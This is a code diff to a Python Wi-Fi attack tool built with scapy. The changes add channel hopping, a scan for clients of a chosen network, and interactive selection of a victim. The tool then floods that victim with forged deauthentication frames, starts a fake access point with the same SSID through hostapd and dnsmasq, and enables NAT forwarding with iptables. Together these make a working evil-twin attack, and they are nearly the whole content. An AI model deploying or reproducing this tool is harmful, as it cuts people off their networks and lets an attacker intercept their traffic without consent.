@@ -9,8 +9,10 @@ import os
 from scapy.layers.http import HTTPRequest
 import json
 from scapy.layers.inet import IP
+from scapy.sendrecv import sniff
 
 ap_list = {}
+clients_set = {""}
 
 def print_wifi_list():
     header = PrettyTable(['SSID', 'MAC ADRESS'])
@@ -28,16 +30,15 @@ def choose_ssid():
         raise IOError
 
 
-def deauth_attack(gateway_mac, interface):
-    print("hello " + gateway_mac)
-    target_mac = "ff:ff:ff:ff:ff:ff"
+def deauth_attack(gateway_mac, interface, target_mac):
+    #target_mac = "ff:ff:ff:ff:ff:ff"
     #target_mac = "08:c5:e1:87:79:c1"
     packet = RadioTap() / Dot11(type=0, subtype=12, addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth(reason=7)
     sendp(packet, iface=interface, count=10000, inter=0.1)
 
 
 def create_fake_ap(ssid, interface):
-    print("create_fake_ap")
+    print("something")
     nameOfDir = "Fake_AP"
     nameConfFile = f"{nameOfDir}/hostapd.conf"
     channel = 11
@@ -72,7 +73,6 @@ def change_host_file():
 
 
 def dnsmasq_service(interface):
-    print("dnsmasq_service")
     nameOfDir = "Fake_AP"
     nameConfFile = f"{nameOfDir}/dnsmasq.conf"
     ip_Range = '192.168.1.2,192.168.1.30,255.255.255.0,12h'
@@ -101,7 +101,7 @@ def dnsmasq_service(interface):
 def fowardTraffic():
     print("fowardTraffic")
     os.system('iptables --table nat --append POSTROUTING --out-interface wlp2s0 -j MASQUERADE')
-    os.system('iptables --append FORWARD --in-interface wlan0mon -j ACCEPT')
+    os.system(f'iptables --append FORWARD --in-interface {interfaceName} -j ACCEPT')
     os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
 
 
@@ -111,29 +111,65 @@ def write_file(fName, text, mode='w'):
     f.close()
 
 
+def change_channel():
+    ch = 1
+    while True:
+        os.system(f"iwconfig {interfaceName} channel {ch}")
+        ch = ch % 14 + 1
+        time.sleep(0.5)
 
+
+def switch_channels():
+    channel_changer = Thread(target=change_channel)
+    channel_changer.daemon = True
+    channel_changer.start()
 
 def scanWifi(pkt):
     if pkt.haslayer(Dot11Beacon):  
         if pkt.type == 0 and pkt.subtype == 8:  
                 ap_list[pkt.info.decode("utf-8")] = (pkt.addr3)
-                
-        
+
+def getClients(packet):
+    if packet.haslayer(Dot11Beacon):  
+        bssid = packet.addr3
+        dest = packet.addr2
+        src = packet.addr1
+        if ap_list[ssid] == src:
+            clients_set.add(dest)
+
+def scan_clients():
+    target_bssid = ap_list[ssid].lower()
+    print(f"scanning for clients on {target_bssid}")
+    sniff(iface=interfaceName, prn=getClients, timeout=20)
+    print_clients(clients_set)
+
+def print_clients(clients_set):
+    print()
+    print("BSSID")
+    for c in clients_set:
+        if c == "00:00:00:00:00:00" or c == '' or c == "ff:ff:ff:ff:ff:ff":
+            continue
+        else:
+            print(c)
+    print()
 
 
 if __name__ == '__main__':
     interfaceName = sys.argv[1]
     start_monitor(interfaceName)
+    switch_channels()
     print(f"Sniffing with {interfaceName} please wait...")
     sniff(prn=scanWifi, iface=interfaceName, timeout=15)
     print_wifi_list()
     ssid = choose_ssid()
-    start_monitor_airmon(interfaceName)
-    print("Start Deauthentication attack on " + ssid)
-    interfaceName = "wlan0mon"
-    #deauth_attack(ap_list[ssid], interfaceName)
+    print(f"scanning clients on {ssid}")
+    scan_clients()
+    client_to_attack = input("Select client to attack \t")
+    #start_monitor_airmon(interfaceName)
+    print("Start Deauthentication attack on " + client_to_attack)
+    #interfaceName = "wlan0mon"
+    deauth_attack(ap_list[ssid], interfaceName, client_to_attack)
     start_new_thread(create_fake_ap, (ssid, interfaceName,))
     start_new_thread(fowardTraffic, ())
     start_new_thread(dnsmasq_service, (interfaceName,))
-    time.sleep(10)
 
